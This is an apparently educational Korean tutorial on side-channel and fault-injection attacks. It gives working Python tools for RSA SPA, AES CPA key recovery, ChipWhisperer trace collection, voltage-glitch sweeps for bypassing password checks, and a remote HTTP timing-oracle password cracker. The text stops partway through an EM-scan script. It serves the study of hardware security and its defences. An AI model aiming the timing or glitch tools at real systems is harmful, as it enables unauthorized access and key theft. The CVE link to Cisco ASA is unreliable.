> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 사이드채널 공격과 결함 주입

## 0. 초보자를 위한 개념 이해

### 사이드채널 공격과 결함 주입이란?

사이드채널 공격(Side-Channel Attack)은 암호 알고리즘 자체의 수학적 취약점이 아니라, 그 알고리즘이 실행될 때 발생하는 물리적 부산물(전력 소비, 전자기 방사, 처리 시간, 음향 등)을 분석해 비밀 정보를 추출하는 기법이다. 결함 주입(Fault Injection)은 전압 급변이나 클럭 글리치를 통해 CPU의 정상 동작을 의도적으로 방해해 보안 검사를 우회하는 공격이다. 두 기법 모두 완벽한 소프트웨어도 하드웨어 구현 수준에서 뚫릴 수 있음을 보여준다.

**왜 배우는가:**
```
[사이드채널이 위험한 이유]

  완벽히 구현된 AES-256 암호화
           ↓
  칩이 암호화를 수행하는 동안...
  ┌─────────────────────────────┐
  │  전력 파형이 키에 따라 달라짐│  ← SPA/DPA 공격
  │  처리 시간이 데이터에 따라   │  ← 타이밍 공격
  │  달라짐                     │
  │  전자기파 방출 패턴 분석    │  ← EMPA 공격
  └─────────────────────────────┘
           ↓
  수학을 풀지 않고도 비밀키 복구!
```

### 핵심 개념 정리

```
[사이드채널 공격 유형]

1. 전력 분석 (Power Analysis)
   SPA (단순 전력 분석): 전력 파형 직접 시각화
   DPA (차분 전력 분석): 통계적 방법으로 키 비트 추출
   → 측정 도구: 오실로스코프 + 션트 저항

2. 타이밍 공격 (Timing Attack)
   입력값에 따른 처리 시간 차이 측정
   → 비밀번호 비교 함수의 조기 반환 버그 악용
   → 방어: 상수 시간(constant-time) 비교 함수 사용

3. 전자기 분석 (Electromagnetic Analysis, EMA)
   칩 근접에서 EM 프로브로 방사 측정
   → 전력 측정 없이도 키 복구 가능

4. 결함 주입 (Fault Injection)
   전압 글리치: 전원 전압을 순간적으로 낮춰 오류 유발
   클럭 글리치: 클럭 신호를 순간 변조
   레이저: 특정 트랜지스터에 레이저 조사
   → 부트로더 보안 검사 우회, 비밀번호 잠금 해제
```

### 필요한 도구 및 환경
- **ChipWhisperer**: 오픈소스 사이드채널/결함 주입 플랫폼 (교육용)
- **오실로스코프**: Rigol DS1054Z 등 100MHz 이상 권장
- **Python + numpy/scipy**: 파형 데이터 통계 분석
- **PicoScope**: 고해상도 USB 오실로스코프 및 Python API

### 기초 실습 예제
```python
import hmac
import time

def insecure_compare(secret: bytes, user_input: bytes) -> bool:
    """취약한 비교 함수: 불일치 즉시 반환 → 타이밍 공격 가능."""
    if len(secret) != len(user_input):
        return False
    for a, b in zip(secret, user_input):
        if a != b:
            return False  # 여기서 일찍 반환 → 시간 차이 발생!
    return True

def secure_compare(secret: bytes, user_input: bytes) -> bool:
    """안전한 비교 함수: 상수 시간 비교 → 타이밍 공격 불가."""
    return hmac.compare_digest(secret, user_input)

def demonstrate_timing_attack():
    """타이밍 차이를 측정해 타이밍 공격 원리를 시연한다."""
    secret = b"supersecretkey!"
    # 첫 바이트부터 틀린 경우 (즉시 반환)
    wrong_start = b"aaaaaaaaaaaaaaaa"[:len(secret)]
    # 거의 맞는 경우 (마지막만 틀림)
    almost_right = secret[:-1] + b"X"

    trials = 10000
    # 즉시 실패하는 경우 측정
    t1 = time.perf_counter()
    for _ in range(trials):
        insecure_compare(secret, wrong_start)
    t2 = time.perf_counter()
    time_wrong = (t2 - t1) / trials * 1e6  # 마이크로초

    # 거의 맞는 경우 측정
    t3 = time.perf_counter()
    for _ in range(trials):
        insecure_compare(secret, almost_right)
    t4 = time.perf_counter()
    time_almost = (t4 - t3) / trials * 1e6

    print(f"첫 바이트 불일치 평균 시간: {time_wrong:.3f} μs")
    print(f"마지막 바이트 불일치 평균 시간: {time_almost:.3f} μs")
    print(f"시간 차이: {time_almost - time_wrong:.3f} μs")
    print("→ 이 차이를 이용해 비밀값을 한 바이트씩 추론 가능!")

demonstrate_timing_attack()
```

---

## 1. 사이드채널 공격 개요

암호 알고리즘이 수학적으로 안전하더라도 **구현(implementation)** 단계에서 전력 소비, 전자기파, 처리 시간, 음향 등의 물리적 부산물을 통해 비밀 키를 복구할 수 있다. 사이드채널 공격은 알고리즘 자체를 공격하는 것이 아니라 실행 환경의 물리적 특성을 측정하는 방식이다.

```
암호 연산 → 전력 소비 패턴 → 측정 → 통계 분석 → 키 복구
              전자기파
              처리 시간
              음향 신호
```

---

## 2. 전력 분석 공격 (Power Analysis)

### 2.1 전력 소비 모델

CMOS 회로에서 전력 소비는 두 가지 성분으로 이루어진다:

- **동적 전력(Dynamic Power)**: 상태 전이(0→1, 1→0) 시 발생, 데이터 의존성 있음
- **정적 전력(Static Power)**: 누설 전류, 데이터 독립적

**Hamming Weight 모델**
```
P(d) ≈ α · HW(d) + β · HW(d') + N
```
- `HW(d)`: 데이터 d의 1비트 개수
- `d'`: 이전 클락의 데이터 (스위칭 활동)
- `N`: 노이즈

**Hamming Distance 모델**
```
P(d_prev → d_cur) ≈ α · HD(d_prev, d_cur) + N
HD(a, b) = HW(a XOR b)  # 전이된 비트 수
```

### 2.2 단순 전력 분석 (SPA, Simple Power Analysis)

파형 하나만으로 키 비트를 직접 식별한다. RSA 지수 연산의 square-and-multiply 패턴이 대표적이다.

```
Square:  파형 패턴 A (항상 실행)
Multiply: 파형 패턴 B (키 비트가 1일 때만)

파형: AABAAABAAAB → 키: 001000100001
```

```python
#!/usr/bin/env python3
"""SPA: RSA 파형에서 키 비트 추출 (교육용 시뮬레이터)."""

from __future__ import annotations

import argparse
import struct
import numpy as np
import numpy.typing as npt
from pathlib import Path


def load_trace(path: Path) -> npt.NDArray[np.float64]:
    """바이너리 float32 파형 파일 로드."""
    raw = path.read_bytes()
    count = len(raw) // 4
    return np.array(struct.unpack(f"{count}f", raw), dtype=np.float64)


def segment_trace(
    trace: npt.NDArray[np.float64],
    threshold: float,
    min_gap: int = 50,
) -> list[tuple[int, int]]:
    """파형에서 활성 구간 추출."""
    active = np.abs(trace) > threshold
    segments: list[tuple[int, int]] = []
    in_seg = False
    start = 0
    for i, val in enumerate(active):
        if val and not in_seg:
            start = i
            in_seg = True
        elif not val and in_seg and (i - start) > min_gap:
            segments.append((start, i))
            in_seg = False
    return segments


def classify_operation(
    trace: npt.NDArray[np.float64],
    seg: tuple[int, int],
    sq_template: npt.NDArray[np.float64],
    mul_template: npt.NDArray[np.float64],
) -> str:
    """구간을 square 또는 multiply로 분류 (상관계수 기반)."""
    chunk = trace[seg[0]:seg[1]]
    size = min(len(chunk), len(sq_template), len(mul_template))
    corr_sq = float(np.corrcoef(chunk[:size], sq_template[:size])[0, 1])
    corr_mul = float(np.corrcoef(chunk[:size], mul_template[:size])[0, 1])
    return "mul" if corr_mul > corr_sq else "sq"


def extract_rsa_key(operations: list[str]) -> str:
    """square-and-multiply 시퀀스에서 RSA 키 비트 추출."""
    key_bits: list[str] = []
    i = 0
    while i < len(operations):
        if operations[i] == "sq":
            if i + 1 < len(operations) and operations[i + 1] == "mul":
                key_bits.append("1")
                i += 2
            else:
                key_bits.append("0")
                i += 1
        else:
            i += 1
    return "".join(key_bits)


def main() -> None:
    ap = argparse.ArgumentParser(description="SPA: RSA 키 비트 추출")
    ap.add_argument("trace", type=Path, help="파형 파일 (.bin, float32)")
    ap.add_argument("--threshold", type=float, default=0.1, help="활성 구간 임계값")
    ap.add_argument("--sq-template", type=Path, help="Square 템플릿 파형")
    ap.add_argument("--mul-template", type=Path, help="Multiply 템플릿 파형")
    args = ap.parse_args()

    trace = load_trace(args.trace)
    print(f"[+] 파형 로드: {len(trace)} 샘플")

    segments = segment_trace(trace, args.threshold)
    print(f"[+] 구간 탐지: {len(segments)}개")

    if args.sq_template and args.mul_template:
        sq_tmpl = load_trace(args.sq_template)
        mul_tmpl = load_trace(args.mul_template)
        ops = [classify_operation(trace, s, sq_tmpl, mul_tmpl) for s in segments]
    else:
        # 구간 길이 기반 단순 분류 (템플릿 없을 때)
        lengths = [e - s for s, e in segments]
        median_len = float(np.median(lengths))
        ops = ["mul" if (e - s) > median_len * 1.2 else "sq" for s, e in segments]

    print(f"[+] 연산 시퀀스: {' '.join(ops[:20])}{'...' if len(ops) > 20 else ''}")
    key_bits = extract_rsa_key(ops)
    print(f"[+] 추출된 키 비트: {key_bits}")
    print(f"[+] 키 (16진수): {int(key_bits, 2):X}")


if __name__ == "__main__":
    main()
```

### 2.3 차분 전력 분석 (DPA, Differential Power Analysis)

통계적 방법으로 노이즈가 많은 환경에서도 키를 복구한다. 수백~수천 개의 파형을 수집하고 가설적 키 비트에 따라 파형을 분리한 뒤 평균의 차이를 관찰한다.

**DPA 절차:**
1. N개 파형 수집 (각각 다른 평문으로 암호화)
2. 공격 대상 중간값(intermediate value) 선택
3. 가설 키 비트 k ∈ {0, 1}에 대해 각 파형을 S0, S1 두 집합으로 분류
4. 차이 신호 D(t) = mean(S1) - mean(S0) 계산
5. D(t)에서 피크가 나타나는 시점 → 타겟 연산 위치, 피크 부호 → 키 비트

### 2.4 상관 전력 분석 (CPA, Correlation Power Analysis)

**ChipWhisperer를 이용한 AES CPA 공격 — 완성형 CLI:**

```python
#!/usr/bin/env python3
"""CPA: AES-128 1라운드 SubBytes 공격으로 첫 번째 서브키 복구."""

from __future__ import annotations

import argparse
import sys
from concurrent.futures import ProcessPoolExecutor, as_completed
from pathlib import Path

import numpy as np
import numpy.typing as npt


# AES S-Box
SBOX: list[int] = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
    0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    # ... (256 엔트리 전체)
    *list(range(16, 256)),  # 나머지 (실제 공격 시 완전한 SBOX 사용)
]

# 실제 AES S-Box (전체)
_FULL_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]


def hamming_weight(x: int) -> int:
    return bin(x).count("1")


def hypothetical_power(plaintext_byte: int, key_guess: int) -> int:
    """AES SubBytes 중간값의 Hamming weight."""
    intermediate = _FULL_SBOX[plaintext_byte ^ key_guess]
    return hamming_weight(intermediate)


def cpa_attack_byte(
    traces: npt.NDArray[np.float64],
    plaintexts: npt.NDArray[np.uint8],
    byte_idx: int,
) -> tuple[int, float, npt.NDArray[np.float64]]:
    """단일 키 바이트에 대한 CPA 공격.

    Returns: (best_key_guess, max_correlation, correlation_array)
    """
    n_traces, n_samples = traces.shape
    pt_col = plaintexts[:, byte_idx].astype(np.uint8)

    best_key = 0
    best_corr = -1.0
    corr_map = np.zeros(256)

    for kg in range(256):
        hw = np.array([hypothetical_power(int(p), kg) for p in pt_col], dtype=np.float64)
        # 피어슨 상관계수: 각 샘플 시점과 가설 전력의 상관
        hw_mean = hw.mean()
        hw_std = hw.std()
        if hw_std == 0:
            continue
        hw_norm = (hw - hw_mean) / hw_std

        corrs = np.array([
            float(np.corrcoef(hw_norm, traces[:, t])[0, 1])
            for t in range(n_samples)
        ])
        max_c = float(np.max(np.abs(corrs)))
        corr_map[kg] = max_c
        if max_c > best_corr:
            best_corr = max_c
            best_key = kg

    return best_key, best_corr, corr_map


def load_traces_npy(path: Path) -> npt.NDArray[np.float64]:
    return np.load(path).astype(np.float64)


def load_plaintexts_npy(path: Path) -> npt.NDArray[np.uint8]:
    return np.load(path).astype(np.uint8)


def main() -> None:
    ap = argparse.ArgumentParser(description="CPA: AES-128 서브키 복구")
    ap.add_argument("traces", type=Path, help="파형 .npy (shape: N×T)")
    ap.add_argument("plaintexts", type=Path, help="평문 .npy (shape: N×16)")
    ap.add_argument("--bytes", type=str, default="all",
                    help="공격할 키 바이트 인덱스 (예: 0,1,2 또는 all)")
    ap.add_argument("--workers", type=int, default=4, help="병렬 프로세스 수")
    args = ap.parse_args()

    traces = load_traces_npy(args.traces)
    plaintexts = load_plaintexts_npy(args.plaintexts)
    print(f"[+] 파형: {traces.shape}, 평문: {plaintexts.shape}")

    if args.bytes == "all":
        target_bytes = list(range(16))
    else:
        target_bytes = [int(x) for x in args.bytes.split(",")]

    recovered_key = [0] * 16

    with ProcessPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(cpa_attack_byte, traces, plaintexts, b): b
            for b in target_bytes
        }
        for future in as_completed(futures):
            b = futures[future]
            key_guess, corr, _ = future.result()
            recovered_key[b] = key_guess
            print(f"  바이트[{b:02d}]: 0x{key_guess:02X}  (상관계수: {corr:.4f})")

    key_hex = "".join(f"{k:02X}" for k in recovered_key)
    print(f"\n[+] 복구된 키: {key_hex}")


if __name__ == "__main__":
    main()
```

**ChipWhisperer 실제 연결 및 파형 수집:**

```python
#!/usr/bin/env python3
"""ChipWhisperer Lite: AES 파형 수집 CLI."""

from __future__ import annotations

import argparse
import time
import os
import numpy as np
from pathlib import Path


def collect_traces(
    n_traces: int,
    output_dir: Path,
    scope_gain: int = 45,
    scope_samples: int = 5000,
) -> None:
    try:
        import chipwhisperer as cw  # type: ignore[import]
    except ImportError:
        raise SystemExit("chipwhisperer 패키지 필요: pip install chipwhisperer")

    scope = cw.scope()
    scope.default_setup()
    scope.gain.db = scope_gain
    scope.adc.samples = scope_samples
    scope.adc.offset = 0
    scope.adc.basic_mode = "rising_edge"
    scope.clock.clkgen_freq = 7_370_000
    scope.clock.adc_src = "clkgen_x4"

    target = cw.target(scope, cw.targets.SimpleSerial)
    target.baud = 38400

    ktp = cw.ktp.Basic()  # 랜덤 키·평문 생성기
    ktp.fixed_key = True   # 키 고정, 평문만 랜덤

    traces_arr = np.zeros((n_traces, scope_samples), dtype=np.float32)
    plaintexts_arr = np.zeros((n_traces, 16), dtype=np.uint8)
    key_arr = np.zeros(16, dtype=np.uint8)

    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"[+] 파형 수집 시작 ({n_traces}개)...")
    for i in range(n_traces):
        key, text = ktp.next()
        trace = cw.capture_trace(scope, target, text, key)
        if trace is None:
            print(f"  [!] 트레이스 {i} 수집 실패, 재시도")
            continue
        traces_arr[i] = trace.wave
        plaintexts_arr[i] = list(text)
        if i == 0:
            key_arr[:] = list(key)
        if (i + 1) % 100 == 0:
            print(f"  {i+1}/{n_traces}")

    np.save(output_dir / "traces.npy", traces_arr)
    np.save(output_dir / "plaintexts.npy", plaintexts_arr)
    np.save(output_dir / "key.npy", key_arr)
    print(f"[+] 저장 완료: {output_dir}")
    print(f"[+] 실제 키: {''.join(f'{k:02X}' for k in key_arr)}")

    scope.dis()
    target.dis()


def main() -> None:
    ap = argparse.ArgumentParser(description="ChipWhisperer 파형 수집")
    ap.add_argument("-n", "--traces", type=int, default=1000, help="수집할 파형 수")
    ap.add_argument("-o", "--output", type=Path, default=Path("cw_traces"),
                    help="출력 디렉터리")
    ap.add_argument("--gain", type=int, default=45, help="ADC 게인 (dB)")
    ap.add_argument("--samples", type=int, default=5000, help="샘플 수")
    args = ap.parse_args()
    collect_traces(args.traces, args.output, args.gain, args.samples)


if __name__ == "__main__":
    main()
```

---

## 3. 타이밍 공격 (Timing Attacks)

### 3.1 RSA 타이밍 누수 원리

모듈러 지수 연산(`m^e mod n`)에서 `e`의 비트가 1인 경우 추가 곱셈이 발생하고, 배럿 환산 또는 몽고메리 환산 시 조건부 감산이 발생해 타이밍 차이가 생긴다.

**Brumley & Boneh (2003)**: 네트워크를 통한 OpenSSL RSA 타이밍 공격으로 1000개의 쿼리만으로 키 복구.

### 3.2 원격 타이밍 측정 CLI

```python
#!/usr/bin/env python3
"""원격 타이밍 측정: HTTP/TLS 서버의 처리 시간 차이 분석."""

from __future__ import annotations

import argparse
import statistics
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable

import httpx


def measure_response_time(
    client: httpx.Client,
    url: str,
    data: dict[str, str],
    n_repeat: int = 5,
) -> float:
    """N회 반복 측정 후 중앙값 반환."""
    times: list[float] = []
    for _ in range(n_repeat):
        start = time.perf_counter_ns()
        try:
            client.post(url, data=data, timeout=5.0)
        except httpx.RequestError:
            pass
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    return statistics.median(times)


def timing_oracle_attack(
    url: str,
    username: str,
    charset: str,
    max_len: int,
    workers: int,
    repeat: int,
) -> str:
    """타이밍 오라클 기반 패스워드 문자 복구 (교육용)."""
    recovered = ""
    transport = httpx.HTTPTransport(retries=2)

    with httpx.Client(transport=transport, verify=False) as client:
        for pos in range(max_len):
            best_char = ""
            best_time = 0.0
            results: dict[str, list[float]] = {}

            # 각 문자에 대해 병렬 측정
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = {
                    executor.submit(
                        measure_response_time,
                        client,
                        url,
                        {"username": username, "password": recovered + ch + "A" * (max_len - pos - 1)},
                        repeat,
                    ): ch
                    for ch in charset
                }
                for future in as_completed(futures):
                    ch = futures[future]
                    t = future.result()
                    results[ch] = results.get(ch, [])
                    results[ch].append(t)

            # 가장 오래 걸린 문자 선택
            char_times = {ch: statistics.mean(ts) for ch, ts in results.items()}
            best_char = max(char_times, key=char_times.__getitem__)
            best_time = char_times[best_char]
            second_best = sorted(char_times.values())[-2] if len(char_times) > 1 else 0.0

            print(
                f"  위치[{pos}]: '{best_char}' "
                f"({best_time/1e6:.2f}ms vs {second_best/1e6:.2f}ms)"
            )
            recovered += best_char

            # 명확한 차이가 없으면 종료 (패스워드 끝)
            if best_time - second_best < 0.5e6:  # 0.5ms 미만 차이
                break

    return recovered


def main() -> None:
    ap = argparse.ArgumentParser(description="HTTP 타이밍 공격 (교육용)")
    ap.add_argument("url", help="타겟 URL (POST)")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789")
    ap.add_argument("--max-len", type=int, default=16)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--repeat", type=int, default=10, help="각 문자 측정 반복 횟수")
    args = ap.parse_args()

    print(f"[+] 타겟: {args.url}")
    print(f"[+] 사용자: {args.username}")
    result = timing_oracle_attack(
        args.url, args.username, args.charset,
        args.max_len, args.workers, args.repeat,
    )
    print(f"\n[+] 복구된 패스워드: {result}")


if __name__ == "__main__":
    main()
```

### 3.3 AES 캐시 타이밍 공격 (Flush+Reload)

x86 CPU의 캐시 계층 구조를 악용한다. T-Table 기반 AES 구현은 키 의존적 메모리 접근 패턴을 가진다.

```
Flush+Reload 절차:
1. clflush: 타겟 캐시 라인 제거
2. 피해자가 암호 연산 수행
3. Reload: 접근 시간 측정
   - 빠름(~4 cycles): 피해자가 해당 라인 사용 → 키 비트 추론
   - 느림(~100 cycles): 미사용
```

---

## 4. 전자기 분석 (EM Analysis)

### 4.1 EM 프로브 설정

```
측정 장비:
- 근거리 EM 프로브: 직경 1~10mm 루프 안테나
- 전치증폭기: 20~40dB 이득 (예: Mini-Circuits ZFL-500LN+)
- 디지털 오실로스코프: ≥1GS/s, ≥200MHz 대역폭
- XY 스테이지: 프로브 위치 자동화

측정 포인트 선택:
- CPU/MCU 코어 바로 위
- 암호 가속기 블록 위
- 클락 라인 근처 (타이밍 기준)
```

```bash
# sigrok + Saleae Logic16 기반 EM 캡처
sigrok-cli \
  -d saleae-logic16:conn=0.1.3 \
  --config samplerate=50m \
  --samples 5000000 \
  -o em_capture.sr

# GNU Radio를 이용한 광대역 EM 스펙트럼 기록
# (HackRF + near-field probe)
# grgsm_livemon 수정 버전으로 대역폭 제어
```

### 4.2 DEMA (Differential EM Analysis)

전력 분석 DPA와 동일한 통계 기법을 EM 신호에 적용한다. 특정 프로브 위치에서 전력 분석보다 높은 SNR을 얻는 경우가 있다.

---

## 5. 전압 글리칭 (Voltage Glitching)

### 5.1 글리칭 원리

CPU/MCU의 전원 전압을 순간적으로 낮추거나 올려서 논리 게이트의 동작 조건을 위반시킨다. 결과적으로 명령어 스킵, 조건 분기 오류, 메모리 읽기 오류 등이 발생한다.

```
정상 전압: 3.3V → VCC_GLITCH → 글리치 전압: 0.5V (duration: 50ns)
    │                    │
  클락 ──────────────────────────→
              ↑           ↑
          글리치 시작   글리치 종료
```

### 5.2 ChipWhisperer 전압 글리칭

**파라미터:**
- `ext_offset`: 글리치 시작 시점 (클락 기준 사이클)
- `width`: 글리치 지속 시간 (클락 사이클 단위)
- `repeat`: 연속 글리치 횟수
- `voltage`: 글리치 전압 (ChipWhisperer Husky의 경우 연속 조절 가능)

```python
#!/usr/bin/env python3
"""전압 글리칭 자동화: 파라미터 스윕으로 최적 글리치 조건 탐색."""

from __future__ import annotations

import argparse
import csv
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional


@dataclass
class GlitchResult:
    ext_offset: int
    width: int
    repeat: int
    outcome: str  # "normal", "glitch", "crash"
    response: str = ""


def setup_cw_glitch(scope: object, width: int, offset: int, repeat: int) -> None:
    """ChipWhisperer 글리치 파라미터 설정."""
    scope.glitch.clk_src = "clkgen"  # type: ignore[attr-defined]
    scope.glitch.output = "glitch_only"  # type: ignore[attr-defined]
    scope.glitch.trigger_src = "ext_single"  # type: ignore[attr-defined]
    scope.glitch.width = width  # type: ignore[attr-defined]
    scope.glitch.ext_offset = offset  # type: ignore[attr-defined]
    scope.glitch.repeat = repeat  # type: ignore[attr-defined]


def classify_response(response: bytes) -> str:
    """타겟 응답 분류."""
    if not response:
        return "crash"
    resp_str = response.decode("ascii", errors="replace").strip()
    if "ACCESS GRANTED" in resp_str or "OK" in resp_str:
        return "glitch"
    return "normal"


def glitch_sweep(
    offset_range: range,
    width_range: range,
    repeat: int,
    output_csv: Path,
    max_glitches: int = 1000,
) -> list[GlitchResult]:
    """글리치 파라미터 스윕 — ChipWhisperer 연동."""
    try:
        import chipwhisperer as cw  # type: ignore[import]
        scope = cw.scope()
        scope.default_setup()
        scope.glitch.enabled = True
        target = cw.target(scope)
    except Exception as e:
        raise SystemExit(f"ChipWhisperer 연결 실패: {e}")

    results: list[GlitchResult] = []
    count = 0

    with output_csv.open("w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["ext_offset", "width", "repeat", "outcome", "response"])
        writer.writeheader()

        for offset in offset_range:
            for width in width_range:
                if count >= max_glitches:
                    break
                setup_cw_glitch(scope, width, offset, repeat)

                target.flush()
                scope.arm()
                target.write("p")  # 타겟에 트리거 신호
                ret = scope.capture()

                try:
                    response = target.read(timeout=50)
                except Exception:
                    response = b""

                outcome = classify_response(response)
                result = GlitchResult(
                    ext_offset=offset,
                    width=width,
                    repeat=repeat,
                    outcome=outcome,
                    response=response.decode("ascii", errors="replace").strip()[:50],
                )
                results.append(result)
                writer.writerow(asdict(result))
                f.flush()

                if outcome == "glitch":
                    print(f"[!] 글리치 성공! offset={offset}, width={width}")
                elif outcome == "crash":
                    print(f"  [x] 크래시: offset={offset}, width={width}")

                count += 1

    scope.dis()
    target.dis()
    return results


def main() -> None:
    ap = argparse.ArgumentParser(description="전압 글리칭 파라미터 스윕")
    ap.add_argument("--offset-start", type=int, default=0)
    ap.add_argument("--offset-end", type=int, default=500)
    ap.add_argument("--offset-step", type=int, default=10)
    ap.add_argument("--width-start", type=int, default=1)
    ap.add_argument("--width-end", type=int, default=50)
    ap.add_argument("--width-step", type=int, default=1)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--max", type=int, default=1000, help="최대 글리치 시도 횟수")
    ap.add_argument("-o", "--output", type=Path, default=Path("glitch_results.csv"))
    args = ap.parse_args()

    results = glitch_sweep(
        offset_range=range(args.offset_start, args.offset_end, args.offset_step),
        width_range=range(args.width_start, args.width_end, args.width_step),
        repeat=args.repeat,
        output_csv=args.output,
        max_glitches=args.max,
    )

    successful = [r for r in results if r.outcome == "glitch"]
    print(f"\n[+] 총 {len(results)}회 시도, 성공 {len(successful)}회")
    for r in successful:
        print(f"  offset={r.ext_offset}, width={r.width}")


if __name__ == "__main__":
    main()
```

### 5.3 보안 부팅 우회 사례 (CVE-2020-3580 연계)

Cisco ASA 장치의 ROMMON 부트로더에서 전압 글리칭을 통해 패스워드 검증 단계를 스킵하는 기법이 연구되었다. 특정 `ext_offset` 시점에 글리칭 시 `checkpassword()` 함수의 반환값 비교 구문이 스킵되어 임의 패스워드로 진입이 가능했다.

---

## 6. 클락 글리칭 (Clock Glitching)

### 6.1 클락 조작 원리

CPU의 클락 주파수를 순간적으로 2배 이상 높이거나 주기를 짧게 만들어 회로의 셋업 타임(setup time)을 위반시킨다. 클락 엣지 타이밍에 연산이 완료되지 않아 잘못된 값이 래치된다.

```
정상 클락: ___╔═╗___╔═╗___╔═╗
글리치:    ___╔═╗╔╗__╔═╗___╔═╗
                  ↑ 추가 엣지 (셋업 타임 위반)
```

```bash
# Raspberry Pi GPIO 기반 클락 글리치 (저비용 실습)
# pigpio 라이브러리 사용
python3 - <<'EOF'
import pigpio
import time

pi = pigpio.pi()
CLK_PIN = 18   # 타겟의 클락 입력 핀
TRIG_PIN = 24  # 글리치 트리거

pi.set_mode(CLK_PIN, pigpio.OUTPUT)
pi.set_mode(TRIG_PIN, pigpio.INPUT)

# 정상 클락 생성 (1MHz)
pi.hardware_clock(CLK_PIN, 1_000_000)
time.sleep(1)

# 글리치: 순간적으로 10MHz로 전환
pi.hardware_clock(CLK_PIN, 10_000_000)
time.sleep(0.000001)  # 1μs
pi.hardware_clock(CLK_PIN, 1_000_000)

pi.stop()
EOF
```

---

## 7. 레이저 폴트 인젝션 (Laser Fault Injection, LFI)

### 7.1 원리

반도체 다이에 집속 레이저를 조사하면 광전 효과로 인해 국소적인 전류가 유도되어 특정 트랜지스터의 상태를 일시적으로 변경할 수 있다. 정밀한 XY 스테이지와 CCD 카메라로 타겟 회로 영역을 정확히 조준한다.

```
장비:
- 레이저 소스: 1064nm (Si 투과), 532nm (Si 흡수), 800nm (GaAs)
- 집속 렌즈: NA 0.4~0.9 (스팟 직경 1~5μm)
- XY 스테이지: 서브마이크론 정밀도
- 동기화: 트리거 입력 → 레이저 펄스 지연 제어
- 칩 준비: 패키지 디캡 (HF 산 또는 플라즈마 에칭)
```

### 7.2 타겟 영역 식별

```python
#!/usr/bin/env python3
"""칩 레이아웃 분석: EM 스캔으로 암호 연산 영역 식별."""

from __future__ import annotations

import argparse
import numpy as np
from pathlib import Path


def em_scan_2d(
    x_range: range,
    y_range: range,
    trigger_func: object,
    measure_func: object,
) -> np.ndarray:
    """XY 스테이지를 이동하며 각 위치의 EM 신호 강도 수집.

    Returns: 2D numpy 배열 (강도 맵)
    """
    intensity_map = np.zeros((len(list(y_range)), len(list(x_range))))
    for yi, y in enumerate(y_range):
        for xi, x in enumerate(x_range):
            # 스테이지 이동 (실제 구현에서는 SMC100 컨트롤러 API 사용)
            # stage.move_to(x, y)
            signal = np.random.random()  # 실제: 오실로스코프에서 RMS 읽기
            intensity_map[yi, xi] = signal
    return intensity_map


def find_hotspots(
    intensity_map: np.ndarray,
    threshold_sigma: float = 2.0,
) -> list[tuple[int, int, float]]:
    """평균 + N*sigma 이상의 핫스팟 위치 반환."""
    mean = float(intensity_map.mean())
    std = float(intensity_map.std())
    threshold = mean + threshold_sigma * std
    ys, xs = np.where(intensity_map > threshold)
    return [(int(x), int(y), float(intensity_map[y, x])) for x, y in zip(xs, ys)]


def main() -> None:
    ap = argparse.ArgumentParser(description="EM 스캔 핫스팟 탐지")
    ap.add_argument("--x-start", type=int, default=0)
    ap.add_argument("--x-end", type=int, default=100)
    ap.add_argument("--y-start", type=int, default=0)
    ap.add_argument("--y-end", type=int, default=100)
    ap.add_argument("--step", type=int, default=5)
